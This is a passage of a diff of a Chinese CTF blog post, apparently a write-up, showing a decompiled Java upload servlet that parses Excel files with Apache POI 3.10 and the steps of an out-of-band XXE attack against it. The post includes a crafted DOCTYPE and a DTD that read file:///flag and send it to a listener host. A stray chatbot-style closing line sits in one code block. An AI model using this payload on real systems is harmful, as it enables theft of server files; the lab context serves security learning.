class="string">&quot;xlsx&quot;</span>.equals(fileExtName)))</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Workbook</span> <span class="variable">wb1</span> <span class="operator">=</span> WorkbookFactory.create(in);</span><br><span class="line">            <span class="type">Sheet</span> <span class="variable">sheet</span> <span class="operator">=</span> wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">            System.out.println(sheet.getFirstRowNum());</span><br><span class="line">          &#125; <span class="keyword">catch</span> (InvalidFormatException e) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">saveFilename</span> <span class="operator">=</span> makeFileName(filename);</span><br><span class="line">        request.setAttribute(<span class="string">&quot;saveFilename&quot;</span>, saveFilename);</span><br><span class="line">        request.setAttribute(<span class="string">&quot;filename&quot;</span>, filename);</span><br><span class="line">        <span class="type">String</span> <span class="variable">realSavePath</span> <span class="operator">=</span> makePath(saveFilename, savePath);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(realSavePath + <span class="string">&quot;/&quot;</span> + saveFilename);</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((len = in.read(buffer)) &gt; <span class="number">0</span>)</span><br><span class="line">          out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">        in.close();</span><br><span class="line">        out.close();</span><br><span class="line">        label438: message = <span class="string">&quot;文件上传成功!&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (FileUploadException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    request.setAttribute(<span class="string">&quot;message&quot;</span>, message);</span><br><span class="line">    request.getRequestDispatcher(<span class="string">&quot;/ListFileServlet&quot;</span>).forward(request, response); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> String <span class="title function_">makeFileName</span><span class="params">(String filename)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> UUID.randomUUID().toString() + <span class="string">&quot;_&quot;</span> + filename; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> String <span class="title function_">makePath</span><span class="params">(String filename, String savePath)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">hashCode</span> <span class="operator">=</span> filename.hashCode();</span><br><span class="line">    <span class="type">int</span> <span class="variable">dir1</span> <span class="operator">=</span> hashCode &amp; <span class="number">0xF</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">dir2</span> <span class="operator">=</span> (hashCode &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">dir</span> <span class="operator">=</span> savePath + <span class="string">&quot;/&quot;</span> + dir1 + <span class="string">&quot;/&quot;</span> + dir2;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dir);</span><br><span class="line">    <span class="keyword">if</span> (!(file.exists()))</span><br><span class="line">      file.mkdirs();</span><br><span class="line">    <span class="keyword">return</span> dir;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.abc.servlet;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.PrintStream;<br><span class="hljs-keyword">import</span> java.util.Iterator;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.UUID;<br><span class="hljs-keyword">import</span> javax.servlet.RequestDispatcher;<br><span class="hljs-keyword">import</span> javax.servlet.ServletContext;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> org.apache.commons.fileupload.FileItem;<br><span class="hljs-keyword">import</span> org.apache.commons.fileupload.FileUploadException;<br><span class="hljs-keyword">import</span> org.apache.commons.fileupload.disk.DiskFileItemFactory;<br><span class="hljs-keyword">import</span> org.apache.commons.fileupload.servlet.ServletFileUpload;<br><span class="hljs-keyword">import</span> org.apache.poi.openxml4j.exceptions.InvalidFormatException;<br><span class="hljs-keyword">import</span> org.apache.poi.ss.usermodel.Sheet;<br><span class="hljs-keyword">import</span> org.apache.poi.ss.usermodel.Workbook;<br><span class="hljs-keyword">import</span> org.apache.poi.ss.usermodel.WorkbookFactory;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UploadServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span><br>&#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span><br>    <span class="hljs-keyword">throws</span> ServletException, IOException<br>  &#123;<br>    doPost(request, response); &#125;<br><br>  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">savePath</span> <span class="hljs-operator">=</span> getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/upload&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">tempPath</span> <span class="hljs-operator">=</span> getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/temp&quot;</span>);<br>    <span class="hljs-type">File</span> <span class="hljs-variable">tempFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(tempPath);<br>    <span class="hljs-keyword">if</span> (!(tempFile.exists()))<br>      tempFile.mkdir();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-type">DiskFileItemFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DiskFileItemFactory</span>();<br>      factory.setSizeThreshold(<span class="hljs-number">102400</span>);<br>      factory.setRepository(tempFile);<br>      <span class="hljs-type">ServletFileUpload</span> <span class="hljs-variable">upload</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletFileUpload</span>(factory);<br><br>      upload.setHeaderEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>      upload.setFileSizeMax(<span class="hljs-number">1048576L</span>);<br>      upload.setSizeMax(<span class="hljs-number">10485760L</span>);<br>      <span class="hljs-keyword">if</span> (!(ServletFileUpload.isMultipartContent(request)))<br>        <span class="hljs-keyword">return</span>;<br>      <span class="hljs-type">List</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> upload.parseRequest(request);<br>      <span class="hljs-type">Iterator</span> <span class="hljs-variable">localIterator</span> <span class="hljs-operator">=</span> list.iterator();<br>      <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123; FileItem fileItem;<br>        String filename;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123; <span class="hljs-keyword">do</span> &#123; String str;<br>            <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123; <span class="hljs-keyword">if</span> (!(localIterator.hasNext())) <span class="hljs-keyword">break</span> label438; fileItem = (FileItem)localIterator.next();<br>              <span class="hljs-keyword">if</span> (!(fileItem.isFormField())) <span class="hljs-keyword">break</span>;<br>              <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> fileItem.getFieldName();<br>              str = fileItem.getString(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>            &#125;<br><br>            filename = fileItem.getName(); &#125;<br>          <span class="hljs-keyword">while</span> (filename == <span class="hljs-literal">null</span>); <span class="hljs-keyword">if</span> (!(filename.trim().equals(<span class="hljs-string">&quot;&quot;</span>))) <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileExtName</span> <span class="hljs-operator">=</span> filename.substring(filename.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>) + <span class="hljs-number">1</span>);<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> fileItem.getInputStream();<br>        <span class="hljs-keyword">if</span> ((filename.startsWith(<span class="hljs-string">&quot;excel-&quot;</span>)) &amp;&amp; (<span class="hljs-string">&quot;xlsx&quot;</span>.equals(fileExtName)))<br>          <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Workbook</span> <span class="hljs-variable">wb1</span> <span class="hljs-operator">=</span> WorkbookFactory.create(in);<br>            <span class="hljs-type">Sheet</span> <span class="hljs-variable">sheet</span> <span class="hljs-operator">=</span> wb1.getSheetAt(<span class="hljs-number">0</span>);<br>            System.out.println(sheet.getFirstRowNum());<br>          &#125; <span class="hljs-keyword">catch</span> (InvalidFormatException e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);<br>            e.printStackTrace();<br>          &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">saveFilename</span> <span class="hljs-operator">=</span> makeFileName(filename);<br>        request.setAttribute(<span class="hljs-string">&quot;saveFilename&quot;</span>, saveFilename);<br>        request.setAttribute(<span class="hljs-string">&quot;filename&quot;</span>, filename);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">realSavePath</span> <span class="hljs-operator">=</span> makePath(saveFilename, savePath);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(realSavePath + <span class="hljs-string">&quot;/&quot;</span> + saveFilename);<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> ((len = in.read(buffer)) &gt; <span class="hljs-number">0</span>)<br>          out.write(buffer, <span class="hljs-number">0</span>, len);<br>        in.close();<br>        out.close();<br>        label438: message = <span class="hljs-string">&quot;文件上传成功!&quot;</span>;<br>      &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (FileUploadException e) &#123;<br>      e.printStackTrace();<br>    &#125;<br>    request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, message);<br>    request.getRequestDispatcher(<span class="hljs-string">&quot;/ListFileServlet&quot;</span>).forward(request, response); &#125;<br><br>  <span class="hljs-keyword">private</span> String <span class="hljs-title function_">makeFileName</span><span class="hljs-params">(String filename)</span> &#123;<br>    <span class="hljs-keyword">return</span> UUID.randomUUID().toString() + <span class="hljs-string">&quot;_&quot;</span> + filename; &#125;<br><br>  <span class="hljs-keyword">private</span> String <span class="hljs-title function_">makePath</span><span class="hljs-params">(String filename, String savePath)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">hashCode</span> <span class="hljs-operator">=</span> filename.hashCode();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">dir1</span> <span class="hljs-operator">=</span> hashCode &amp; <span class="hljs-number">0xF</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">dir2</span> <span class="hljs-operator">=</span> (hashCode &amp; <span class="hljs-number">0xF0</span>) &gt;&gt; <span class="hljs-number">4</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">dir</span> <span class="hljs-operator">=</span> savePath + <span class="hljs-string">&quot;/&quot;</span> + dir1 + <span class="hljs-string">&quot;/&quot;</span> + dir2;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(dir);<br>    <span class="hljs-keyword">if</span> (!(file.exists()))<br>      file.mkdirs();<br>    <span class="hljs-keyword">return</span> dir;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>从<code>UploadServlet.class</code>可以关注到如下关键代码：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((filename.startsWith(<span class="string">&quot;excel-&quot;</span>)) &amp;&amp; (<span class="string">&quot;xlsx&quot;</span>.equals(fileExtName)))</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Workbook</span> <span class="variable">wb1</span> <span class="operator">=</span> WorkbookFactory.create(in);</span><br><span class="line">            <span class="type">Sheet</span> <span class="variable">sheet</span> <span class="operator">=</span> wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">            System.out.println(sheet.getFirstRowNum());</span><br><span class="line">          &#125; <span class="keyword">catch</span> (InvalidFormatException e) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> ((filename.startsWith(<span class="hljs-string">&quot;excel-&quot;</span>)) &amp;&amp; (<span class="hljs-string">&quot;xlsx&quot;</span>.equals(fileExtName)))<br>          <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Workbook</span> <span class="hljs-variable">wb1</span> <span class="hljs-operator">=</span> WorkbookFactory.create(in);<br>            <span class="hljs-type">Sheet</span> <span class="hljs-variable">sheet</span> <span class="hljs-operator">=</span> wb1.getSheetAt(<span class="hljs-number">0</span>);<br>            System.out.println(sheet.getFirstRowNum());<br>          &#125; <span class="hljs-keyword">catch</span> (InvalidFormatException e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);<br>            e.printStackTrace();<br>          &#125;<br></code></pre></td></tr></table></figure>
 
 <p>其中<code>Apache POI XML外部实体攻击()</code>相关对应漏洞版本为<code>poi-ooxml-3.10-FINAL.jar及以下版本</code>，并且也是针对<code>Office</code>的攻击，于是可以进行尝试。创建名为<code>excel-1.xlsx</code>的文件，修改后缀为<code>zip</code>,使用<code>winrar</code>进行解压，修改<code>[Content-Types].xml</code>文件，在第2行添加</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://ip:8001/file.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [ </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://ip:8001/file.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%remote;%int;%send;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>然后将文件重新压缩，并改后缀为<code>xlsx</code></p>
 <p>接着使用<code>python3</code>起一个HTTP服务<code>python -m http.server 8001</code>开启HTTP服务，并放置<code>file.dtd</code>文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip:8989?p=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%int;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip:8989?p=%file;&#x27;&gt;&quot;&gt;<br>%int;<br>%send;<br></code></pre></td></tr></table></figure>
 
 <p>开启监听，上传xlsx文件</p>
-<pre><code>
+<pre><code class="hljs">
 如果你有任何其他需求或需要进一步的解释，请告诉我。
 </code></pre>
 
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ssrf</div>
+      <div>https://theganlove.github.io/2024/09/01/ssrf/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>uert</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年9月1日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
       
     </div>
-    <footer class="article-footer">
-      <a data-url="https://theganlove.github.io/2024/09/01/ssrf/" data-id="cm0kx5k5e000po8dk67spcxw5" data-title="ssrf" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
+    <div class="license-icon iconfont"></div>
   </div>
-  
-    
-<nav id="article-nav">
-  
-    <a href="/2024/09/01/%E8%84%9A%E6%9C%AC%E5%B7%A5%E5%85%B7/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          脚本工具
-        
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/09/01/%E8%84%9A%E6%9C%AC%E5%B7%A5%E5%85%B7/" title="脚本工具">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">脚本工具</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/09/01/jwt%E7%AD%89%E8%AE%A4%E8%AF%81went/" title="jwt等认证went">
+                        <span class="hidden-mobile">jwt等认证went</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
       </div>
-    </a>
-  
-  
-    <a href="/2024/09/01/jwt%E7%AD%89%E8%AE%A4%E8%AF%81went/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">jwt等认证went</div>
-    </a>
-  
-</nav>
-
-  
-</article>
-
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/">CTF-web</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">php代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/php%E5%AE%A1%E8%AE%A1/">php审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/rce/">rce</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/">文件操作</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">环境搭建</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%89%BA%E6%9C%AF/">艺术</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%A9%E5%91%BD%E6%8B%82%E6%99%93/">革命拂晓</a></li></ul>
     </div>
-  </div>
 
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-php/" rel="tag">web php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E5%AD%97%E6%84%9F%E6%82%9F/" rel="tag">文字感悟</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83/" rel="tag">环境</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%87%AA%E5%B7%B1%E7%9A%84%E8%89%BA%E6%9C%AF/" rel="tag">自己的艺术</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/web-php/" style="font-size: 20px;">web php</a> <a href="/tags/%E6%96%87%E5%AD%97%E6%84%9F%E6%82%9F/" style="font-size: 10px;">文字感悟</a> <a href="/tags/%E7%8E%AF%E5%A2%83/" style="font-size: 15px;">环境</a> <a href="/tags/%E8%87%AA%E5%B7%B1%E7%9A%84%E8%89%BA%E6%9C%AF/" style="font-size: 10px;">自己的艺术</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/08/">August 2024</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2024/09/01/%E9%9A%90%E5%86%99%E7%B3%BB%E5%88%97/">隐写系列</a>
-          </li>
-        
-          <li>
-            <a href="/2024/09/01/%E8%84%9A%E6%9C%AC%E5%B7%A5%E5%85%B7/">脚本工具</a>
-          </li>
-        
-          <li>
-            <a href="/2024/09/01/ssrf/">ssrf</a>
-          </li>
-        
-          <li>
-            <a href="/2024/09/01/jwt%E7%AD%89%E8%AE%A4%E8%AF%81went/">jwt等认证went</a>
-          </li>
-        
-          <li>
-            <a href="/2024/09/01/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">js原型链污染</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
+    <div class="side-col d-none d-lg-block col-lg-2">
       
-      &copy; 2024 John Doe<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
 
     </div>
-    <nav id="mobile-nav">
+  </div>
+</div>
+
+
+
+
+
   
-    <a href="/" class="mobile-nav-link">Home</a>
+
+
+
   
-    <a href="/archives" class="mobile-nav-link">Archives</a>
+
+
+
   
-</nav>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
     
 
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
 
-<script src="/js/jquery-3.6.4.min.js"></script>
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
